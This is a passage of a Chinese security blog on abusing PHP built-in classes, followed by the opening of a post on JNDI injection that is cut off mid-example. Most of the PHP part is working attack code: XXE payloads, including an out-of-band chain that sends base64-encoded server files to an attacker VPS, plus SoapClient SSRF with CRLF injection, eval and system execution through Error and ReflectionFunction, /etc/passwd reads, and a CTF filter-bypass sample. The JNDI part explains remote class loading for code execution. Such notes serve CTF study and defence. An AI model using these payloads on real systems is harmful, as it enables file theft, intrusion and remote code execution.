<p>利用<code>SimpleXMLElement</code>构造一个XML文档，从而利用 XXE读取文件 。当文件中有&lt; &gt; &amp; ‘ “ 这5个符号时，会导致XML文件解析错误，所以要利用php://filter，将要读取的文件内容经过 base64编码 后输出。如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[   </span><br><span class="line">&lt;!ENTITY name SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;flag.php&quot; &gt;]</span><br><span class="line">&gt;</span><br><span class="line">&lt;a&gt;&amp;name;&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>

<p>有几个地方需要注意以下，在url中不能直接打<code>&amp;</code> 会被歧义，我们使用 <code>%26</code> 还有就是<code>resource=</code>后面不需要引号包裹。第二个参数里的2对应的模式是 LIBXML_NOENT。<br>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name&#x3D;SimpleXMLElement&amp;param&#x3D;&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY name SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;flag.php&quot; &gt;]&gt;&lt;a&gt;%26name;&lt;&#x2F;a&gt;&amp;param2&#x3D;2</span><br></pre></td></tr></table></figure>



<p>至于为什么第二个参数为二，实际上这里2对应的模式是 LIBXML_NOENT ，我们直接记住用二吧不然就是直接百度。</p>
<h3 id="远程读取"><a href="#远程读取" class="headerlink" title="远程读取"></a>远程读取</h3><p>必须有三个参数可控，才能读取远程xml文件。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NotFound</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;404&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">spl_autoload_register(</span><br><span class="line">    <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">new</span> NotFound();</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"><span class="variable">$classname</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$param</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$param2</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$param3</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param3&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;param3&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(class_exists(<span class="variable">$classname</span>))&#123;</span><br><span class="line">    <span class="comment">//$newclass = new $classname($param,$param2);</span></span><br><span class="line">    <span class="variable">$newclass</span> = <span class="keyword">new</span> <span class="variable">$classname</span>(<span class="variable">$param</span>,<span class="variable">$param2</span>,<span class="variable">$param3</span>);</span><br><span class="line">    var_dump(<span class="variable">$newclass</span>);</span><br><span class="line"><span class="comment">//    foreach ($newclass as $key=&gt;$value)</span></span><br><span class="line"><span class="comment">//        echo $key.&#x27;=&gt;&#x27;.$value.&#x27;&lt;br&gt;&#x27;;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>SimpleXMLElement读取远程文件evil.xml-&gt;evil.xml请求send.xml，实际执行的是send.xml</p>
<p>send.php负责保存结果，在vps上构造如下evil.xml、send.xml和send.php这三个文件。</p>
<p>evil.xml：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;47.xxx.xxx.72&#x2F;send.xml&quot;&gt;</span><br><span class="line">%remote;</span><br><span class="line">%all;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p>send.xml：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php&quot;&gt;</span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;192.168.111.129&#x2F;send.php?file&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>



<p>send.php：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">file_put_contents(<span class="string">&quot;result.txt&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) ;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后在url中构造如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;show.php?module&#x3D;SimpleXMLElement&amp;args[]&#x3D;http:&#x2F;&#x2F;47.xxx.xxx.72&#x2F;evil.xml&amp;args[]&#x3D;2&amp;args[]&#x3D;true</span><br></pre></td></tr></table></figure>

<p>接收到数据</p>
<p><img src="php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8.assets/607d89c2d1bf9.jpg"></p>
<h1 id="Error-Exception"><a href="#Error-Exception" class="headerlink" title="Error/Exception"></a>Error/Exception</h1><p>__toString</p>
<h2 id="Error"><a href="#Error" class="headerlink" title="Error"></a>Error</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;&lt;script&gt;alert(1)&lt;/script&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8.assets/607d89c33a1fc.jpg"></p>
<h2 id="getmessage"><a href="#getmessage" class="headerlink" title="getmessage"></a>getmessage</h2><p>getMessage可直接传入eval执行命令，将转换成hex执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$a &#x3D; new Error(&#39;?&#39;);</span><br><span class="line">$c &#x3D; &quot;getMessage&quot;;</span><br><span class="line">$d &#x3D; &quot;eval(phpinfo())&quot;;</span><br><span class="line">eval(&quot;\$a-&gt;$c($d);&quot;);</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(hex2bin(<span class="string">&quot;6563686f20706928293b&quot;</span>))</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> bin2hex(<span class="string">&#x27;phpinfo();&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Error</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;getMessage(<span class="keyword">eval</span>(hex2bin(<span class="string">&quot;706870696e666f28293b&quot;</span>)));</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//echo bin2hex(&#x27;phpinfo()&#x27;);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>





<h1 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h1><p>php存在内置类<code>SoapClient::__call</code>，存在可以触发<code>__call</code>方法时，可以进行ssrf</p>
<p>进行SSRF</p>
<p>配合CRLF</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://192.168.111.129:5555/path&#x27;</span>;</span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;data=something&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: PHPSESSID=my_session&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.join(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;^^Content-Length: &#x27;</span>.(<span class="keyword">string</span>)strlen(<span class="variable">$post_string</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_string</span>,<span class="string">&#x27;uri&#x27;</span>      =&gt; <span class="string">&quot;aaab&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$aaa</span> = serialize(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$aaa</span> = str_replace(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="variable">$aaa</span> = str_replace(<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$aaa</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = unserialize(<span class="variable">$aaa</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;not_exists_function();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>





<p>成功接收到报文</p>
<p><img src="php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8.assets/607d89c3b4772.jpg"></p>
<h1 id="DirectoryIterator"><a href="#DirectoryIterator" class="headerlink" title="DirectoryIterator"></a>DirectoryIterator</h1><p>遍历目录</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">DirectoryIterator</span> <span class="keyword">extends</span> <span class="built_in">SplFileInfo</span> <span class="keyword">implements</span> <span class="built_in">SeekableIterator</span> &#123;</span><br><span class="line">	<span class="comment">/* 方法 */</span></span><br><span class="line">	<span class="keyword">public</span> __construct ( <span class="keyword">string</span> <span class="variable">$path</span> )</span><br><span class="line">	<span class="keyword">public</span> current ( ) : <span class="built_in">DirectoryIterator</span></span><br><span class="line">	<span class="keyword">public</span> getATime ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">public</span> getBasename ( <span class="keyword">string</span> <span class="variable">$suffix</span> = ? ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> getCTime ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">public</span> getExtension ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> getFilename ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> getGroup ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">public</span> getInode ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">public</span> getMTime ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">public</span> getOwner ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">public</span> getPath ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> getPathname ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> getPerms ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">public</span> getSize ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">public</span> getType ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> isDir ( ) : <span class="keyword">bool</span></span><br><span class="line">	<span class="keyword">public</span> isDot ( ) : <span class="keyword">bool</span></span><br><span class="line">	<span class="keyword">public</span> isExecutable ( ) : <span class="keyword">bool</span></span><br><span class="line">	<span class="keyword">public</span> isFile ( ) : <span class="keyword">bool</span></span><br><span class="line">	<span class="keyword">public</span> isLink ( ) : <span class="keyword">bool</span></span><br><span class="line">	<span class="keyword">public</span> isReadable ( ) : <span class="keyword">bool</span></span><br><span class="line">	<span class="keyword">public</span> isWritable ( ) : <span class="keyword">bool</span></span><br><span class="line">	<span class="keyword">public</span> key ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> next ( ) : <span class="keyword">void</span></span><br><span class="line">	<span class="keyword">public</span> rewind ( ) : <span class="keyword">void</span></span><br><span class="line">	<span class="keyword">public</span> seek ( <span class="keyword">int</span> <span class="variable">$position</span> ) : <span class="keyword">void</span></span><br><span class="line">	<span class="keyword">public</span> __toString ( ) : <span class="keyword">string</span>    <span class="comment">// 以字符串形式获取文件名</span></span><br><span class="line">	<span class="keyword">public</span> valid ( ) : <span class="keyword">bool</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h1 id="FilesystemIterator"><a href="#FilesystemIterator" class="headerlink" title="FilesystemIterator"></a>FilesystemIterator</h1><p>列出目录下文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br></pre></td></tr></table></figure>



<h1 id="SplFileInfo"><a href="#SplFileInfo" class="headerlink" title="SplFileInfo"></a>SplFileInfo</h1><p>读取文件，但是不添加其他参数只能读取第一行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$context</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$context</span>;</span><br></pre></td></tr></table></figure>

<p>可以通过遍历的方式读取所有内容</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$context</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$context</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="ReflectionFunction"><a href="#ReflectionFunction" class="headerlink" title="ReflectionFunction"></a>ReflectionFunction</h1><p>invokeArgs 可执行命令</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> ReflectionFunction(<span class="string">&#x27;call_user_func&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>-&gt;invokeArgs(<span class="keyword">array</span>(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;whoami&#x27;</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> ReflectionFunction(<span class="string">&#x27;system&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>-&gt;invokeArgs(<span class="keyword">array</span>(<span class="string">&#x27;whoami&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8.assets/607d8ab33c9bd.jpg"></p>
<p><img src="php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8.assets/U4bbd76a58f51487b9f366ef386ad88504.jpg"></p>
<p>例子</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="string">&#x27;/sys|exec|sh|flag|pass|file|open|dir|2333|;|#|\/\/|&gt;/i&#x27;</span>,<span class="string">&quot;NepnEpneP&quot;</span>, <span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$_</span> = waf(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">    <span class="variable">$__</span> = waf(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="variable">$_</span>(<span class="variable">$__</span>);&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;?&#x27;</span>);&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = waf(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line">    <span class="variable">$d</span> = waf(<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>]);</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;\$a-&gt;<span class="subst">$c</span>(<span class="subst">$d</span>);&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="string">&quot;getMessage&quot;</span>;</span><br><span class="line">    <span class="variable">$d</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;echo \$a-&gt;<span class="subst">$c</span>(<span class="subst">$d</span>);&quot;</span>);&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//$a = new Error(&#x27;?&#x27;);</span></span><br><span class="line"><span class="comment">//$c = &quot;getMessage&quot;;</span></span><br><span class="line"><span class="comment">//$d = &quot;eval(phpinfo())&quot;;</span></span><br><span class="line"><span class="comment">//eval(&quot;\$a-&gt;$c($d);&quot;);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-04-17T05:24:56.000Z" title="2021-04-17T05:24:56.000Z">2021-04-17</time>发表</span><span class="level-item"><time dateTime="2021-04-17T05:26:57.965Z" title="2021-04-17T05:26:57.965Z">2021-04-17</time>更新</span><span class="level-item">10 分钟读完 (大约1515个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/04/17/JNDI%E6%B3%A8%E5%85%A5/">JNDI注入</a></h1><div class="content"><h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><h2 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h2><p>Java命名和目录接口（JNDI）是一种Java API，类似于一个索引中心，它允许客户端通过name发现和查找数据和对象。JNDI本质上是一个接口，在这个接口下可以实现多种目录系统服务，如RMI、LDAP等，可以通过名称查询相关对象</p>
<p><img src="https://www.hualigs.cn/image/607a712f64075.jpg"></p>
<h2 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h2><p>RMI（Remote Method Invocation）  即Java远程方法调用，一种用于实现远程过程调用的应用程序编程接口，常见的两种接口实现为JRMP（Java Remote Message  Protocol，Java远程消息交换协议）以及CORBA。</p>
<p>相当于跨越jvm，调用一个远程方法。RMI是一种行为，即Java远程方法调用</p>
<h2 id="JRMP"><a href="#JRMP" class="headerlink" title="JRMP"></a>JRMP</h2><p>Java远程方法协议（英语：Java Remote Method Protocol，JRMP）是特定于Java技术的、用于查找和引用远程对象的协议。这是运行在Java远程方法调用（RMI）之下、TCP/IP之上的线路层协议（英语：Wire protocol）。</p>
<p>本质上是一个协议，用于Java RMI过程，功能上相当于web访问中的http协议，只有通过使用该协议才能实现RMI远程方法调用</p>
<h2 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h2><p>LDAP（Lightweight Directory Access Protocol）-轻量目录访问协议。本质上相当于一个数据库，</p>
<h1 id="JNDI注入原理"><a href="#JNDI注入原理" class="headerlink" title="JNDI注入原理"></a>JNDI注入原理</h1><p>JNDI支持多种服务类型，当服务类型为RMI协议时，如果从RMI注册服务中lookup的对象类型为Reference类型或其子类时会导致远程代码执行。</p>
<p>因为Reference类提供了两个重要属性：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.className</span><br><span class="line">远程调用引用的类名</span><br><span class="line"></span><br><span class="line">2.codebase url</span><br><span class="line">决定在进行rmi远程调用时对象的位置，codebase url支持http协议，当通过lookup寻找的远程调用类在RMI服务器的CLASSPATH不存在时就会从指定的codebase url进行类的加载，如果两者都没有，远程调用失败</span><br></pre></td></tr></table></figure>



<p><strong>JNDI RCE漏洞产生原因</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在lookup的时候，会从RMI注册中心下载数据，由于服务名称和对象或命名引用相关联，只要在Registrations注册中心注册一个命名引用，即Reference，它具有三个参数，className、factory、classFactoryLocation。ookup它并下载到本地后，会使用Reference的classFactoryLocation指定的地址去下载className指定class文件，接着加载并实例化，这样就会远程调用类的构造方法，如果把恶意代码放在远程调用类的构造方法中，就可以触发RCE。</span><br></pre></td></tr></table></figure>

<h1 id="JNDI-RMI"><a href="#JNDI-RMI" class="headerlink" title="JNDI+RMI"></a>JNDI+RMI</h1><p>适用版本：小于JDK 6u132<code>, </code>JDK 7u122<code>, </code>JDK 8u113（原因是Java提升了JNDI 限制了<code>Naming/Directory</code>服务中<code>JNDI Reference</code>远程加载<code>Object Factory</code>类的特性。系统属性 <code>com.sun.jndi.rmi.object.trustURLCodebase</code>、<code>com.sun.jndi.cosnaming.object.trustURLCodebase</code> 的默认值变为<code>false</code>，即默认不允许从远程的<code>Codebase</code>加载<code>Reference</code>工厂类。）</p>
<p><strong>测试jdk版本 8u101</strong></p>
<p>CIENT.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String uri = <span class="string">&quot;rmi://127.0.0.1:1099/aa&quot;</span>;</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        ctx.lookup(uri);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>SERVER.java</p>
